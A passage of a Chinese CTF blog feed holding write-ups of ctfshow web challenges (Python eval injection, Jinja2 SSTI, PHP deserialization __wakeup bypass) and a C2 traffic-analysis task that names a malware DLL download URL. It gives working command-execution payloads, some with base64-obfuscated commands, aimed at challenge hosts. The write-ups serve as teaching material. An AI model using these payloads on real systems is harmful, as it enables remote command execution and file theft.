class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            msg = <span class="string">&#x27;Account already exists!&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;</span><br><span class="line">            msg = <span class="string">&#x27;You have successfully registered!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">profile</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;profile2.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], role=session[<span class="string">&#x27;role&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/show/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;show2.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;filename&#x27;</span> <span class="keyword">in</span> request.args:              </span><br><span class="line">            <span class="keyword">return</span> send_file(filename, as_attachment=<span class="literal">True</span>)</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = request.args.get(<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;hello,<span class="subst">&#123;<span class="built_in">eval</span>(s)&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>():</span></span><br><span class="line">   session.pop(<span class="string">&#x27;loggedin&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;id&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;role&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hello路由处有个eval漏洞，这样传参是很危险的，</p><p><img src="/images/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406161902169.png" alt="image-20230406161902169"></p><p>参考</p><p><code>https://www.anquanke.com/post/id/84891/</code></p><p>``<a href="http://1ca40a3d-c1de-44e7-bd25-dda1d37a3031.challenge.ctf.show/hello/?eval=__import__(&#39;os&#39;).popen">http://1ca40a3d-c1de-44e7-bd25-dda1d37a3031.challenge.ctf.show/hello/?eval=__import__(&#39;os&#39;).popen</a>(‘cat /flag_is_h3re’).read()`</p><p>即可</p><h3 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h3><p>右键源代码有zip包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string,render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>(<span class="params">name=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;hello.html&#x27;</span>,name=name)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hellodear</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ge&quot;</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;f&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Nonononon&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p> if “ge” in name:<br>        return render_template_string(‘hello %s’ % name)</p><p>payload 要有  ge</p><p> elif “f” not in name:<br>        return render_template_string(‘hello %s’ % name)</p><p>payload 不能有f</p><p>先获取可用基类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">四种方法皆可</span><br><span class="line">1,   &#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line"></span><br><span class="line">2,   &#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line">3,   &#123;&#123;&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()&#125;&#125;</span><br><span class="line">4， &#123;&#123;().__class__.__mro__[1].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p>获取到后，用脚本嗦一下可用的类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将查找到的父类列表替换到data中</span></span><br><span class="line">data = <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    [&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, ......]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 在这里添加可以利用的类，下面会介绍这些类的利用方法</span></span><br><span class="line">userful_class = [<span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;os._wrap_close&#x27;</span>, <span class="string">&#x27;subprocess.Popen&#x27;</span>, <span class="string">&#x27;warnings.catch_warnings&#x27;</span>, <span class="string">&#x27;_frozen_importlib._ModuleLock&#x27;</span>, <span class="string">&#x27;_frozen_importlib._DummyModuleLock&#x27;</span>, <span class="string">&#x27;_frozen_importlib._ModuleLockManager&#x27;</span>, <span class="string">&#x27;_frozen_importlib.ModuleSpec&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;&#x27;(.*?)&#x27;&quot;</span>)</span><br><span class="line">class_list = re.findall(pattern, data)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> class_list:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> userful_class:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> c:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(class_list.index(c)) + <span class="string">&quot;: &quot;</span> + c)</span><br></pre></td></tr></table></figure><p><img src="/images/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406171826914.png" alt="image-20230406171826914"></p><p>可以看到132的os._wrap_close可用 popen也可用</p><p><code>http://a5d0ef3a-4dec-4de0-9564-0bd0be13b83e.challenge.ctf.show/hello/&#123;&#123;"".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code>即可命令执行</p><p>但是下面执行ls / 时几句不可以了，显示404</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">http://a5d0ef3a-4dec-4de0-9564-0bd0be13b83e.challenge.ctf.show/hello/&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[132].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls $(echo Lw== | base64 -d)&#x27;</span>).<span class="built_in">read</span>()&#125;&#125;</span><br><span class="line"></span><br><span class="line">http://a5d0ef3a-4dec-4de0-9564-0bd0be13b83e.challenge.ctf.show/hello/&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[132].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;$(echo bHM= | base64 -d) $(echo Lw== | base64 -d)&#x27;</span>).<span class="built_in">read</span>()&#125;&#125;</span><br><span class="line"></span><br><span class="line">http://a5d0ef3a-4dec-4de0-9564-0bd0be13b83e.challenge.ctf.show/hello/&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[132].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat $(echo Li4vZmxhZw== | base64 -d)&#x27;</span>).<span class="built_in">read</span>()&#125;&#125;</span><br><span class="line"></span><br><span class="line">官方</span><br><span class="line">/hello/&#123;&#123; <span class="string">&quot;&quot;</span>.__class__.__base__ .__subclasses__()[132].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](request.args.get(<span class="string">&quot;ctfshow&quot;</span>)).<span class="built_in">read</span>()&#125;&#125;ge?ctfshow=cat /flag </span><br><span class="line"></span><br><span class="line">POC1:</span><br><span class="line">&#123;&#123;g.pop.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).<span class="built_in">read</span>()&#125;&#125;</span><br><span class="line">POC2:</span><br><span class="line">&#123;&#123;application.__init__.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">.<span class="built_in">read</span>()&#125;&#125;</span><br><span class="line">POC3:</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">.<span class="built_in">read</span>()&#125;&#125;</span><br></pre></td></tr></table></figure><p><code>http://a5d0ef3a-4dec-4de0-9564-0bd0be13b83e.challenge.ctf.show/hello/&#123;&#123;"".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat $(echo Li4vZmxhZw== | base64 -d)').read()&#125;&#125;</code></p><h4 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h4><p>开局给了源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-24 10:16:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-25 00:25:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1+1&gt;2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">    unserialize(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>显然是反序列化，这里要知道一些魔术方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_construct() 当创建对象时触发，一般用于初始化对象，对变量赋初值</span><br><span class="line">__sleep() 使用serialize()时自动触发 </span><br><span class="line">__wakeup() 使用unserialize()时自动触发</span><br><span class="line">__destruct() 当一个对象被销毁时触发</span><br><span class="line">__toString() 当一个类被当成字符串使用时触发</span><br><span class="line">__invoke() 当尝试以调用函数的方式调用一个对象时触发</span><br><span class="line">__call() 在对象上下文中调用不可访问的方法时触发 </span><br><span class="line">__callStatic() 在静态上下文中调用不可访问的方法时触发 </span><br><span class="line">__get() 用于从不可访问的属性读取数据</span><br><span class="line">__set() 用于将数据写入不可访问的属性</span><br><span class="line">__isset() 在不可访问的属性上调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()触发</span><br><span class="line">__unset() 在不可访问的属性上使用<span class="keyword">unset</span>()时触发</span><br></pre></td></tr></table></figure><p>__wakeup() 使用unserialize()时自动触发 ，代码中使用了 unserialize函数，那就会销毁</p><p>在php5中绕过__wakeup()将对象属性的个数值大于真实的属性就会跳过__wakeup()</p><p>php7环境下，需要序列化ArrObject类来绕过</p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">php5环境下，只需要在正常生成的序列化字符串数字前添加一个+号即可绕过执行</span><br><span class="line">方法:</span><br><span class="line">echo serialize(new ctfshow())</span><br><span class="line">payload: </span><br><span class="line">O:+<span class="number">7</span>:<span class="string">&quot;ctfshow&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;ctfshow&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;cat /f*&quot;</span>;&#125;</span><br><span class="line">php7环境下，需要序列化<span class="type">ArrObject</span>类来绕过</span><br><span class="line">方法:</span><br><span class="line">echo serialize(new <span class="type">ArrayObject</span>(new ctfshow()));</span><br><span class="line">payload:</span><br><span class="line">C:<span class="number">11</span>:<span class="string">&quot;ArrayObject&quot;</span>:<span class="number">61</span>:&#123;x:i:<span class="number">0</span>;O:<span class="number">7</span>:<span class="string">&quot;ctfshow&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;ctfshow&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;cat /f*&quot;</span>;&#125;;m:a:<span class="number">0</span>:&#123;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此题中为php7</p><p>payload  自己加一个public变量即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfshow</span>=<span class="string">&#x27;cat /f*&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1+1&gt;2&#x27;</span>];</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">new</span> ctfshow()));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//C:11:&quot;ArrayObject&quot;:61:&#123;x:i:0;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:7:&quot;cat /f*&quot;;&#125;;m:a:0:&#123;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><code>http://bd6bbd85-fa6e-4a78-ab40-c83485c956ed.challenge.ctf.show/?1%2b1&gt;2=C:11:&quot;ArrayObject&quot;:61:&#123;x:i:0;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:7:&quot;cat /f*&quot;;&#125;;m:a:0:&#123;&#125;&#125;</code></p><p><img src="/images/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406223747040.png" alt="image-20230406223747040"></p><h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><blockquote><p>一直在路上</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023数字中国创新大赛-网络数据安全赛道-数据安全产业人才能力挑战赛-预赛wp</title>
      <link href="/2023/04/01/CTFS/2023%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93-%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E8%83%BD%E5%8A%9B%E6%8C%91%E6%88%98%E8%B5%9B-%E9%A2%84%E8%B5%9Bwp/"/>
      <url>/2023/04/01/CTFS/2023%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93-%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E8%83%BD%E5%8A%9B%E6%8C%91%E6%88%98%E8%B5%9B-%E9%A2%84%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/others/image-20230406143344755.png" alt="image-20230406143344755"></p><p><strong>C2流量分析.1</strong></p><p>EDR在一台机密计算机上检测到终止k4.exe进程的行为，取证人员取出来了该机器的镜像流量，请分析附件流量，回答对应问题。（注意：题目中的程序可能存在恶意操作，如果需要运行或调试，请在虚拟机中操作）</p><p><a href="https://pan.baidu.com/s/1ldNxI6mMfduIxjtAOSMcZQ">https://pan.baidu.com/s/1ldNxI6mMfduIxjtAOSMcZQ</a></p><p><a href="https://pan.baidu.com/s/1ldNxI6mMfduIxjtAOSMcZQ">附件下载</a> 提取码（GAME）<a href="https://share.weiyun.com/QbZIcyjq">备用下载</a></p><p>请提交Payload的完整下载地址。（答案示例：<a href="http://xxx.xxx.xxx/xxx%EF%BC%89">http://xxx.xxx.xxx/xxx）</a></p><p><code>http://imgcache.cloudservicesdevc.tk/picturess/2023/RDSv38.dll</code></p><p><strong>C2流量分析.2</strong></p><p>请提交Payload的SHA256哈希值。（字母大写，请根据流量内容作答）</p><p>右键将这个RDSv38.dll文件导出然后sha256即可</p><p>AA2CBD3103CECAF189F93D787C602679E156CC6FD90E22646D637F01C64222CF</p><p><img src="/images/others/image-20230401164658387.png" alt="image-20230401164658387"></p><p>n6IcHjmQUNOd6TxOkV6WRigEPUZFkO2TIu8cS6MRyrE=</p><p>Aj0S2EgsjOFd_JRsOjcBB_5-fZ1H-9tZVF67-qOWCbw=</p><p>Aj0S2EgsjOFd_JRsOjcBB_5-fZ1H-9tZVF67-qOWCbw=</p><p>Z-Ur0AYZQ9-nNO_O6j5B1slASR-YR2tsssycqHNc_so=</p><p>eBp92fUD7Lk_6qXR2pIjFt3sBH-lW0ul830S-sO6QCQ=</p><p>Erj5UoZfpxT47Bjpg8qg1XmMCKZyKBj1bJ0otszVZPk=</p><p>qkwNBcGK7ZcOrlKKcflivlyiatdAsb2u_sH_-IB5R_Y=</p><p>0smJ2LvvnQonNICFpjOF8CeuOcMIuYLNVbCDucWSVaw=</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">解密后信息： I&#x27;m a hacker.</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">解密后信息： This system has been hacked by me</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">解密后信息： Next, I want to obtain some data</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">加密前信息： test message</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">加密前信息： test message</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">加密前信息： test message</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">加密前信息： test message</span><br><span class="line">解密后信息： 女,小美,<span class="number">500112202304217984</span>,<span class="number">12222222222</span>,<span class="number">111111111111</span>,<span class="number">22222</span>,<span class="number">333333</span></span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">加密前信息： test message</span><br><span class="line">解密后信息： e4 b8 <span class="number">80</span> e4 b8 aa <span class="number">74</span> <span class="number">78</span> <span class="number">74</span> <span class="number">0</span>a e5 <span class="number">95</span> <span class="number">86</span> e4 b8 <span class="number">9</span>a e8 ae a1 e5 <span class="number">88</span> <span class="number">92</span> ef bc <span class="number">88</span> e4 bb <span class="number">85</span> e4 be <span class="number">9</span>b e5 <span class="number">86</span> <span class="number">85</span> e9 <span class="number">83</span> a8 ef bc <span class="number">89</span> e6 ad a4 e5 a4 </span><br><span class="line"><span class="number">84</span> e7 <span class="number">9</span>c <span class="number">81</span> e7 <span class="number">95</span> a5 <span class="number">35</span> <span class="number">77</span> e5 ad <span class="number">97</span> <span class="number">0</span>a</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">加密前信息： test message</span><br><span class="line">解密后信息： bye??</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">加密前信息： test message</span><br><span class="line">解密后信息： no!I finally want to transmit a flag</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">加密前信息： test message</span><br></pre></td></tr></table></figure><p>fernet 解密，一直解就行解出来是一个图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 